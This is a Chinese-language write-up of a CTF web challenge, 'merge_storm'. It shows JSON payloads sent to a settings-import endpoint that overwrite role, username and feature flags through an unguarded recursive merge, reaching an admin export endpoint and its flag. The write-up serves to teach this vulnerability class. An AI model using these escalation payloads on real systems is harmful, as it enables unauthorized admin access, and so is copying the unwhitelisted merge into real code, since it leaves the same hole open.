---
title: 蓝桥杯WEB赛题merge_storm详解（只有两个人解出的赛题）
url: https://mp.weixin.qq.com/s/WD63oBMDCf2sYjx25ZTRUg
source: Doonsec's feed
date: 2026-04-25
fetch_date: 2026-04-26T04:58:27.268097
---

# 蓝桥杯WEB赛题merge_storm详解（只有两个人解出的赛题）

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/ptxZESUjfTFPgCxFrlKEYNeeFp82keOzZlnxQaQLF4WxhDrtHR8uODy2G3BUwWyRbiauiaTMuSGyN31ThtLbVCPPq50qqlyeWgFB3SuowWiaes/0?wx_fmt=jpeg)

# 蓝桥杯WEB赛题merge\_storm详解（只有两个人解出的赛题）

原创

【白】
【白】

白安全组

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

![](https://mmbiz.qpic.cn/sz_mmbiz_png/ptxZESUjfTFgDCvqZW14V1p7CG4s7ZFgaia5moFDTX1Mf6XbI28mAfFVWrD6mJTvYQbiaLcrnpdnJvzX3WFgyIPddjicDQFhzrEoC3Y3JapgyM/640?wx_fmt=png&from=appmsg)

虽然这也是一道难度不算很高的题，但是这题比较有代表性，因为它考的不是我们平时很熟的 SQL 注入、命令执行这类点，而是一个很容易在真实开发里出现的漏洞，也就是配置合并过于随意导致的越权问题，所以这里单独写一篇笔记记录一下。

需要先说明一下，本文整理的时候原容器已经被平台回收了，所以文中的接口返回内容来自我前面打题时留下的复现记录，不过不影响我们理解整道题的利用链。

## 先看首页给我们的提示

我们先访问首页，可以看到返回的是一个非常简单的 JSON：

![](https://mmbiz.qpic.cn/mmbiz_png/ptxZESUjfTGYc0Jrr5N3SSlOkXJticj6hDwxSee299EB0jAZxfIkeQY0rO0DoqwbDpxdWD1OUAa7RjJ3Z3owgcZOBxaFDJr7QU9fETtYdZIU/640?wx_fmt=png&from=appmsg)

```
{  "catalog": "/api/tools",  "message": "import your settings from /api/profile/import",  "name": "merge_storm"}
```

这里其实已经把题眼点出来了。

一个是 `/api/tools`，说明系统里有一个工具目录。

另一个是 `/api/profile/import`，说明有一个“导入个人设置”的功能。

这个时候经验比较足一点的话，其实就应该开始警觉了，因为“导入设置”这种功能如果后端写得比较随意，很容易出现把用户提交的 JSON 直接 merge 到后端对象里的问题。

说白了就是接口鉴权可能存在一些问题，这里就可以尝试接口的越权了

## 再看一下当前用户信息

接着访问一下个人信息接口：

```
GET /api/profile
```

![](https://mmbiz.qpic.cn/mmbiz_png/ptxZESUjfTHwPfI1NiavVxtUB2DHvTYQ0bttGCCHHVcARGz1lWlkHaNXFHCueicEUmGtjEQtFK4Mr1MziaGGiaxx0N5ial68k0V1vbnaS49G1iaCk/640?wx_fmt=png&from=appmsg)

返回内容如下：

```
{  "prefs": {    "layout": "compact",    "theme": "paper"  },  "username": "guest"}
```

这个返回值看起来很正常，一个游客用户，加上一些偏好设置，比如主题和布局。

再看一下工具目录：

```
GET /api/tools
```

![](https://mmbiz.qpic.cn/mmbiz_png/ptxZESUjfTFDseYjyLGfk1mdYqtRqd4WWQQAaUcicu7KYf9j5fAz6SvKWB37J6iaOmNCm3djpns8YN82u1vBYc8EB5s4bn3LV6OjqM9k6SmEs/640?wx_fmt=png&from=appmsg)

返回内容如下：

```
{  "tools": [    {      "route": "/api/profile",      "slug": "profile-view",      "status": "ready"    },    {      "route": "/api/profile/import",      "slug": "settings-import",      "status": "ready"    },    {      "hint": "workspace beta tools are still disabled",      "slug": "labs-preview",      "status": "hidden"    }  ]}
```

这里信息量其实已经很大了。

我们可以看到系统里除了两个正常接口以外，还有一个隐藏工具 `labs-preview`，而且提示信息是：

`workspace beta tools are still disabled`（工作空间测试版工具仍被禁用）

这句话非常重要，它说明这个系统内部应该存在某种 beta tools 的开关，只不过默认没有打开。

为什么先盯上 /api/profile/import

题目表面上说的是导入个人设置，正常情况下，用户应该只能修改类似下面这些东西：

```
{  "prefs": {    "theme": "dark",    "layout": "compact"  }}
```

但是这道题的问题就在于，后端并没有严格限制你只能改 `prefs` 下面的安全字段，而是把你传进来的 JSON 很随意地和后端配置做了 merge。

我们先做一个很简单的测试，看看能不能直接改用户名：

```
POST /api/profile/import HTTP/2Host: eci-2ze6ettsufqb2k1ycz7h.cloudeci1.ichunqiu.com:5000Content-Type: application/jsonContent-Length: 20{"username":"admin"}
```

![](https://mmbiz.qpic.cn/mmbiz_png/ptxZESUjfTGPkQPkcjCVtqj1fdPz2BicIHj5X9nDSMMMkpUAzib6u18g4liaeyKiaP1CRkjR4zI1uCSDVdFgzPj3kOrFbNllvJicCmQ9uWeia6hp4/640?wx_fmt=png&from=appmsg)

然后再次访问：

```
GET /api/profile
```

返回会变成：

```
{  "prefs": {    "layout": "compact",    "theme": "paper"  },  "username": "admin"}
```

这一步其实就已经说明问题了。

因为“导入个人偏好设置”本来不应该允许普通用户直接把自己的 `username` 改成 `admin`，这说明后端不是在“只更新偏好设置”，而是在“把你提交的 JSON 整体往后端对象里并”。

## 这里其实就可以想到利用方向了

既然首页和 `/api/tools` 提示我们系统里存在 beta tools，那我们就应该去尝试污染和 beta tools 相关的配置项。

![](https://mmbiz.qpic.cn/mmbiz_png/ptxZESUjfTFvevhEzF5tX1FiajYYmSzfHKqlF3icDjxkS77f5cFp47pCgM6u3RS8stnICAXKhsenuN444GibcFfNHCOZayI2KNM5K4HmxsEiaV4/640?wx_fmt=png&from=appmsg)

这里的思路并不复杂，就是根据提示去猜一些比较像功能开关的字段，比如：

* `beta_tools`
* `feature_flags`
* `workspace_beta_tools`
* `workspace beta tools`

这个过程本质上就是在试探：哪些字段真的会影响 `/api/tools` 的返回。

其实这里还是有点坑的，个人感觉像是AI出题，全是英文。

## 第一步：把隐藏工具切出来

这里比较关键的一个 payload 是：

```
POST /api/profile/import HTTP/2Host: eci-2ze6ettsufqb2k1ycz7h.cloudeci1.ichunqiu.com:5000Content-Type: application/jsonContent-Length: 37{"feature_flags":{"beta_tools":true}}
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/ptxZESUjfTGyIM99WHnqpWAubJIibPVbnkOickGZR9Lhuic6QdH4o12FArIuzcEDiaXjFazYDstO1cKT4ugY41jFJZozQv1NLbEqDGxzp610XBM/640?wx_fmt=png&from=appmsg)

提交之后，再访问：

```
GET /api/tools
```

这时返回内容会发生变化：

```
{  "tools": [    {      "route": "/api/profile",      "slug": "profile-view",      "status": "ready"    },    {      "route": "/api/profile/import",      "slug": "settings-import",      "status": "ready"    },    {      "hint": "operator approval required",      "slug": "operator-export",      "status": "locked"    }  ]}
```

这里就可以看到，原来隐藏的是 `labs-preview`，结果现在目录里出现了一个新的工具：

`operator-export`

只不过当前状态还是 `locked`，说明我们已经成功碰到后端真正的功能开关了，只是还差一步权限或审批条件。

这一步到底说明了什么

这一步说明了一个非常关键的问题：

用户提交的配置，不仅仅会被存起来，还会真正参与服务端逻辑判断。

也就是说，后端会根据你污染进去的配置字段，动态决定要不要展示某些内部工具。

这类问题在真实环境里是很危险的，因为它意味着你有可能通过一个看起来非常普通的“导入配置”接口，去打开本来不该暴露给普通用户的内部管理功能。

## 第二步：补齐 operator/admin 条件

既然新的工具名字叫 `operator-export`，提示又是 `operator approval required`，那这一步思路就比较清晰了，我们继续尝试污染和管理员、审批、operator 有关的字段。

这里测试下来，可以生效的 payload 例如：

```
POST /api/profile/import HTTP/2Host: eci-2ze6ettsufqb2k1ycz7h.cloudeci1.ichunqiu.com:5000Content-Type: application/jsonContent-Length: 16{"role":"admin"}
```

再次访问：

```
GET /api/tools
```

这时就会看到工具状态从 `locked` 变成 `ready`，并且把真实路由也显示出来了：

![](https://mmbiz.qpic.cn/mmbiz_png/ptxZESUjfTETrjOoqyLOqwq3DWQYOr1IerjuiaZvZySNrm9eFeUPibaibWngfwRVNAJd7FotRz1PA74lfaiamInWnty8Oum9yficticKNxGTgzDJ8/640?wx_fmt=png&from=appmsg)

```
{  "tools": [    {      "route": "/api/profile",      "slug": "profile-view",      "status": "ready"    },    {      "route": "/api/profile/import",      "slug": "settings-import",      "status": "ready"    },    {      "hint": "operator approval required",      "route": "/api/admin/export",      "slug": "operator-export",      "status": "ready"    }  ]}
```

到这里整条利用链其实就已经打通了。

第三步：直接访问导出接口拿 flag

既然路由已经给出来了，那我们直接访问就行：

```
GET /api/admin/export
```

返回如下：

```
{  "flag": "flag{3a328147-2e70-48c4-bf5f-53650c83e4a2}",  "operator": "admin",  "status": "exported"}
```

这样就成功拿到 flag 了。

![](https://mmbiz.qpic.cn/mmbiz_png/ptxZESUjfTH1IMqJHRfFeeLUxgaAlPGreCdQEptZxEepuJdhTyGiaPdYfY66dGfSsSILCa9Z27DJzOVY6PI0Le8pISf5Zica0QALa90h1dlgs/640?wx_fmt=png&from=appmsg)

用一张图梳理一下整道题的利用链

![](https://mmbiz.qpic.cn/mmbiz_png/ptxZESUjfTFXbiaYmXwjibE038bFF6DQPyhtvRO8z34EI6ffZZOC716IojYEqZOPMevGVbic4yNRbr5zibSKIm7ibsmlvzhBENV47bkibpJQt2124/640?wx_fmt=png&from=appmsg)

这里为什么说这题很有代表性

因为这题考的不是一个很炫的漏洞，而是一个在开发里很常见、很容易被忽略的问题。

很多开发者在写“导入配置”“更新设置”“同步偏好”这类功能时，为了图省事，会把用户传上来的 JSON 直接和默认对象做 merge，比如伪代码像这样：

```
def merge(dst, src):    for k, v in src.items():        if isinstance(v, dict) and isinstance(dst.get(k), dict):            merge(dst[k], v)        else:            dst[k] = v
```

```

```

如果没有做字段白名单限制，那么用户就可能修改：

* 用户身份字段
* 功能开关
* 管理员配置
* 调试开关
* 内部工具状态
* 导出导入权限

这题就是这个思路的一个非常标准的例子。

## 这题的知识点一共几个

这题我觉得核心知识点其实有三个。

### 第一个知识点：从提示信息里反推后端配置

像首页里的 `import your settings from /api/profile/import`，还有工具目录里的 `workspace beta tools are still disabled`，这些都不是废话。

它们本质上是在提醒我们：

* 有一个配置导入入口
* 系统里存在 beta tools 开关

所以打这种题时，不要只会扫目录，也要学会从提示信息里猜后端配置结构。

### 第二个知识点：配置合并过于随意会导致越权

正常情况下，用户只能改自己的偏好设置。

但如果后端把你传入的 JSON 整体 merge 进运行时对象里，那么你就有可能顺手把：

* `role`
* `is_admin`
* `feature_flags`
* `beta_tools`

这些原本不该由你控制的字段也改掉。

这就会从“偏好设置修改”直接变成“后台逻辑被用户控制”。

### 第三个知识点：先观察系统行为，再逐步收敛 payload

这一题不是一上来就知道最终字段是什么，而是通过一步一步观察：

1. `/api/profile/import`

   能不能改 `username`
2. `/api/tools`

   会不会因为某些字段发生变化
3. 隐藏工具是变成 `hidden`、`locked` 还是 `ready`
4. 哪个字段负责功能开关，哪个字段负责身份校验

这种打法其实比盲目乱打 payload 更稳，也更贴近真实漏洞挖掘过程。

## 最后总结一下

这题的核心不在于接口多复杂，而在于后端把“导入个人设置”这件事做得太随意了。

本来用户只能改自己的主题和布局，结果因为 merge 没有限制字段，攻击者不仅能改身份相关信息，还能打开内部 beta 工具，最后直接访问管理员导出接口拿到 flag。

所以这题可以用一句很大白话的话来总结：

本来只是想让你换个皮肤，结果你顺手把后台开关也一起改了。

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/1AUjJ6HpTUZSEBicgombkkXIIVoES3iaEpiaicDuJSgjHcRFuKy7L7Nhs9ib6CrB1p6CEQ0GWATuKoiagCCdSsoFfJ1w/0?wx_fmt=png)

白安全组

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/1AUjJ6HpTUZSEBicgombkkXIIVoES3iaEpiaicDuJSgjHcRFuKy7L7Nhs9ib6CrB1p6CEQ0GWATuKoiagCCdSsoFfJ1w/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，...